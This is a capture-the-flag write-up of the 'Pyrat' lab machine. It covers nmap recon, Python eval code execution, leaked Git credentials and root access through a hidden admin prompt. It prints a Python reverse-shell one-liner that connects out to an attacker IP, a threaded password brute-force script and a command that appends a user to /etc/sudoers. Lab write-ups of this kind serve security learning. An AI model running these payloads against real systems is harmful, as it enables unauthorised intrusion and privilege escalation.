# Pyrat — Write-up

## Objective

Test your enumeration skills on this boot-to-root machine.

Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to root.

**Questions to answer:**

- What is the user flag?
- What is the root flag?

---

## Initial Recon

```bash
nmap -sS -sV -sC 10.81.134.250
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings:
|   GetRequest:
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest:
|     name 'OPTIONS' is not defined
|   Help:
|_    name 'HELP' is not defined
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
```

The fingerprint strings are the giveaway here — errors like `name 'GET' is not defined` and `name 'OPTIONS' is not defined` look exactly like raw Python `NameError` tracebacks, not real HTTP responses.

---

## Finding the Eval Server

Going onto the HTTP site (port 8000) I received a message: "Try a more basic connection!" I set up an nc listener:

```bash
nc 10.81.134.250 8000
```

Typing `HELLO` returned a Python error: `name 'hi' is not defined`. So I assumed it's an `eval()`-style listener script. I tested `print("TEST")` and it was successful.

---

## Getting a Reverse Shell

With arbitrary Python execution confirmed, I sent an `os.system()` call wrapping a standard reverse shell one-liner:

```python
os.system("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.132.61\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'")
```

with a listener waiting:

```bash
nc -lvnp 9999
```

Using this script and the nc listener I was able to create a reverse shell.

---

## Finding the User Flag

I had no permissions for ANYTHING, so I ran `linpeas` to find anything interesting. I found:

```
drwxrwxr-x 8 think think 4096 Jun 21  2023 /opt/dev/.git
```

After going into the config, I found the next login details for the pivot:

```
username = think
password = _TH1NKINGPirate$_
```

Using this password I was able to SSH into `think`, finally getting the first flag.

**Flag:** `996bdb1f61#########ca5454705`

---

## Digging Through Git History

Inside `git log` there's a previous commit, `0a3c36d66369fd4b07ddca72e5379461a63470bf`, which contained an older version of the server code:

```python
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
```

This is a small snippet from the earlier version of the HTTP server. The comment `# Check socket is admin and downgrade if is not aprooved` is the most interesting part — it implies an `admin` code path that runs as root before being "downgraded."

---

## Finding and Brute-Forcing the Admin Endpoint

Going back to the console, I typed in `admin` and received a new prompt asking for a password. I asked an AI to create a brute-force script to try passwords against `rockyou.txt`:

```python
import socket, time, sys
from concurrent.futures import ThreadPoolExecutor, as_completed

IP, PORT = "10.81.134.250", 8000
WORDLIST = "/media/guest/D/cyber/rockyou.txt"

def try_login(password):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((IP, PORT))

        s.send(b"admin\n")
        time.sleep(0.1)
        s.recv(1024)  # Read "Password:" prompt

        s.send(f"{password}\n".encode())
        time.sleep(0.1)

        resp = b""
        while True:
            try:
                chunk = s.recv(1024)
                if not chunk: break
                resp += chunk
                if b"Password:" in chunk:  # Failed - got prompt again
                    s.close()
                    return False, None
            except socket.timeout:
                break

        s.close()

        # If we got here and got a response, it's probably success
        if resp:
            return True, password
        return False, None

    except:
        return False, None

def main():
    print(f"[*] Target: {IP}:{PORT}")
    print(f"[*] Wordlist: {WORDLIST}")

    # Quick test with common passwords first
    quick = ["password","123456","admin","admin123","root","toor","letmein","qwerty","abc123","password123"]
    print("[*] Quick scan (10 common passwords)...")
    for pwd in quick:
        print(f"    Trying: {pwd}")
        ok, found = try_login(pwd)
        if ok:
            print(f"\n[+] FOUND: {found}")
            return

    # Then rockyou.txt
    print("[*] Loading rockyou.txt...")
    try:
        with open(WORDLIST, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()][:5000]  # First 5000

        print(f"[*] Testing {len(passwords)} passwords with 20 threads...")

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(try_login, pwd): pwd for pwd in passwords}

            for i, future in enumerate(as_completed(futures), 1):
                ok, found = future.result()
                if ok:
                    print(f"\n[+] FOUND: {found}")
                    executor.shutdown(wait=False)
                    return

                if i % 100 == 0:
                    print(f"    Tried {i}/{len(passwords)}...")

        print("[-] Password not found")

    except FileNotFoundError:
        print(f"[-] Wordlist not found: {WORDLIST}")
    except KeyboardInterrupt:
        print("\n[!] Interrupted")

if __name__ == "__main__":
    main()
```

This gave me the password for the admin shell: `abc123`.

---

## Getting the Root Flag

The admin shell already runs with root privileges. I used it to add my current SSH user (`think`) to the sudoers file:

```python
os.system("echo 'think ALL=(ALL:ALL) ALL' >> /etc/sudoers")
```

Finally:

```bash
cat /root/root.txt
```

**Flag:** `ba5ed03##############80165e221`

---

## Summary

- **Recon:** Nmap found only SSH and an unusual "http-alt" service on port 8000, whose Nmap fingerprint strings were actually raw Python `NameError` messages rather than real HTTP responses — a strong hint the service was evaluating input directly.
- **Eval-based RCE:** Connecting with netcat and sending arbitrary Python confirmed the server was evaluating client input, which was used to trigger a standard reverse-shell one-liner via `os.system()`.
- **User flag via leaked Git credentials:** With a low-privilege shell, `linpeas` flagged an exposed `/opt/dev/.git` directory containing SSH credentials for the `think` user, giving SSH access and the **user flag**.
- **Git history reveals a hidden admin path:** Reviewing an older commit in that same repo revealed a previous version of the server's code with an undocumented `admin` command path that ran privileged logic before "downgrading" the socket.
- **Brute-forcing the admin password:** Re-connecting to the eval server and sending `admin` triggered a password prompt undocumented in the current codebase. A custom brute-force script against a common-password list and `rockyou.txt` recovered the password (`abc123`).
- **Root via the admin shell:** The admin-authenticated session ran as root, and was used to add the `think` user to `/etc/sudoers`, granting full sudo access and the **root flag**.

**Key takeaways:**

- Any server that evaluates client-supplied input as code (Python `eval`, `exec`, or similar) is remote code execution by design — treat "the server echoed a Python error" as a major red flag during recon, not a curiosity.
- Exposed `.git` directories are a recurring source of leaked credentials and, as here, can also leak old application logic (via commit history) that reveals functionality removed or hidden from the current version.
- Removing a feature from the live code doesn't remove the risk if it's still reachable — the "admin" command path had clearly been stripped from the visible source but was still live and password-protected on the running service.
- Weak, guessable passwords (`abc123`) remain one of the most effective attack paths even after every other technical hurdle (RCE, credential leaks, hidden endpoints) has been cleared.
